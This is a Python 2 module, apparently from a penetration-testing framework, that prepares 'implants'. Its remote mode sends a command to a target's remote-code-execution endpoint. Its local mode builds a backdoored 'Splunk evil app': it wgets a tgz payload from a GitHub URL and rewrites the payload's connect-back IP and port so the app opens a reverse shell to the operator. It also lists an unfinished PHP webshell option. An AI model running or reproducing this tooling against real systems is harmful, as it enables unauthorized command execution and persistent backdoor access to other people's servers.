#!/usr/bin/env python
# implants.py - core file for implants
#
# current:
#   - splunk app
#

# --- imports ---
import subprocess
import re
import sys
import requests
import random
import string

# from files if needed
sys.path.append('files')
import core

# --- super colours ---
HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'



def run(): # main for preparing implants

  print OKBLUE
  #target = raw_input('  target[IP]> ')
  #print ENDC

  make_implant = raw_input('  Type (local, remote)> ')
  print ENDC

  if make_implant == 'remote':
    print OKGREEN
    print '  [+] implant: remote'
    print ENDC
    implant_remote()

  elif make_implant == 'local':
    print OKGREEN
    print '  [+] implant: local'
    print ENDC
    implant_local()

  else:
    print FAIL + '  [-] no such implant group, sorry.\n' + ENDC
    core.menu() # starter() # goto main if you don't know what you're doing

##

def implant_remote():

  # todo: one or more sample requests to try... ;S
  # below it's only basic one (as usual, sorry)
  print '\n' + BOLD
  print '  [implant:remote]'
  target = raw_input('  [retype target/ip]: ')
  shttp = raw_input('  [http/https]: ')
  port = raw_input('  [port]: ')
  urlpath = raw_input('  [rcepath]: ')
  param = raw_input('  [param]: ')
  #method = raw_input('  [method]: ')
  print '  [method]: GET' # todo ;)
  cmd = 'id'
  print ENDC

  preparing = shttp + '://'+target+':'+port+'/'+urlpath+'?'+param+'=' + cmd
  req = requests.get(preparing)
  resp = req.text

  print '  -- resp --\n'
  print resp
  print '  -- end of resp --\n'

  ## finished, so goto starter()
  core.menu() # starter()

##

def implant_local():
  print '\n' + BOLD + '  [implant:local]\n'

  # prepare local file to use it as revshell/backdoor/etc
  print
  print '  -- implants - local menu --'
  print ''
  print '      [a] PHP webshell - simple file (win/lin)'      # to fix
  print '      [b] Splunk evil app (lin)'

  #  print '      [e] getRes'...
  print '' + ENDC

  choice = raw_input('  >> ')
  print '  ----  ----  ----  ----  ----'
  print OKGREEN + '\n  [+] Ok, let\'s do this! :)\n' + ENDC

  if choice == 'a':
    print OKGREEN + '  [+] PHP webshell - simple file (win/lin)' + ENDC
    print ''
    # ... todo: ...implant_local_a()

  elif choice == 'b':
    print OKGREEN + '  [+] Splunk evil app (lin)' + ENDC
    print ''
    splunk_evil_app()

  else:
    print FAIL + '[-] wrong. try again next year.\n' + ENDC
    core.menu() # starter() # goto 'main()'


## ---
# our super implants:
#

def splunk_evil_app():
  print OKGREEN
  print '  [+] Creating Splunk evil app (for Linux)' + ENDC
  print '' + BOLD + '\n'

  print '    Press 1 to download or 2 to use local app (tgz):'
  get_or_have = raw_input('    [1/2]: ')

  if get_or_have == '1':
    print '  [+] downloading the app...'
    default_app = 'https://github.com/c610/tmp/raw/master/apka2.tgz'
    getapp = 'wget ' + default_app + ' -O /tmp/apka2.tgz'
    subprocess.call([ getapp ], shell=True)
    print OKGREEN
    print '  [+] app should be ready in /tmp/apka2.tgz'
    print '  [+] preparing...' + ENDC

    random1 = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])
    appname = random1 # new appname cuz Splunk don't like the same :C

    lhost = raw_input('    connecback to[IP]> ')
    lport = raw_input('    connctback to[port] ')


    rewriteapp = "cd /tmp; tar zxvf /tmp/apka2.tgz;"
    rewriteapp += "cd /tmp/apka2/bin;sed -e 's/192.168.1.160/" + lhost + "/g' apka2.py > apkanew.py;"
    rewriteapp += "sed -e 's/4444/" + lport + "/g' apkanew.py > apkafinal.py;"
    rewriteapp += "cd /tmp/apka2/default/;sed -e 's/\[apka2/\[" + appname + "/g' commands.conf > commands.new;"
    rewriteapp += "rm /tmp/apka2/default/commands.conf; mv /tmp/apka2/default/commands.new /tmp/apka2/default/commands.conf;"
    rewriteapp += "rm /tmp/apka2/bin/apka2.py /tmp/apka2/bin/apkanew.py; cd /tmp; tar cf /tmp/apkash.tgz ./apka2/;"
    rewriteapp += "ls -la /tmp/apkash.tgz"

    subprocess.call([rewriteapp], shell=True)
    print OKGREEN + '  [+] Splunk app rewrited: /tmp/apkash.tgz\n' + ENDC
    print appname


  elif get_or_have == '2':
    print '  [+] using local app:'

  else:
   print FAIL + '  [-] Maybe later ;[\n' + ENDC


  print OKGREEN + '  [+] Creating Splunk evil app - finished.\n' + ENDC


